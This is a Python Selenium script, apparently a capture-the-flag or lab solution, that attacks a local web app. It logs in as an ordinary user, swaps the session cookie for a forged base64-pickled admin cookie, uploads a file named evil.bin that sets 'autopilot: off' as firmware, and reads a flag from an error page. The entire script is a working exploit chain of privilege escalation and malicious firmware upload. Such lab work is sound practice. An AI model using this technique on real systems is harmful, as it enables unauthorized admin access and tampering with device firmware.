"""Demonstration exploit using Selenium to manipulate the vulnerable cookie.

This script opens the login page with Selenium, steals the session cookie and
replaces it with a forged admin cookie. It then uploads a firmware file and
finally visits `/fail` to read the flag shown on the 500 page.
"""

import base64
import pickle
from pathlib import Path

from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By


BASE = "http://localhost:5001"  # adjust if the server runs on another port


def main():
    options = Options()
    # use a visible browser if available; fall back to headless otherwise
    if not Path("/usr/bin/firefox").exists():
        options.add_argument("-headless")

    with webdriver.Firefox(options=options) as driver:
        # 1. login as l.perez to obtain a valid session cookie
        driver.get(f"{BASE}/login/l.perez")
        print("[+] Logged in as l.perez")

        # retrieve cookie parameters to reuse domain and path
        cookie = driver.get_cookie("session")
        if not cookie:
            raise RuntimeError("No session cookie received")

        # 2. craft malicious admin cookie
        payload = base64.b64encode(
            pickle.dumps({"username": "hacker", "role": "admin"})
        ).decode()

        cookie["value"] = payload
        driver.add_cookie(cookie)
        print("[+] Replaced session cookie with admin payload")

        # 3. visit dashboard to confirm admin access
        driver.get(f"{BASE}/dashboard")
        print("[+] Dashboard title:", driver.title)
        print(driver.page_source)

        # 4. upload firmware turning autopilot off
        driver.get(f"{BASE}/firmware/update")
        upload = driver.find_element(By.NAME, "file")
        tmp = Path("evil.bin")
        tmp.write_text("autopilot: off\nwarnings: on\n")
        upload.send_keys(str(tmp.resolve()))
        upload.submit()
        print("[+] Firmware uploaded")

        # 5. trigger failure to obtain flag
        driver.get(f"{BASE}/fail")
        print("[+] Flag page:\n", driver.page_source)


if __name__ == "__main__":
    main()

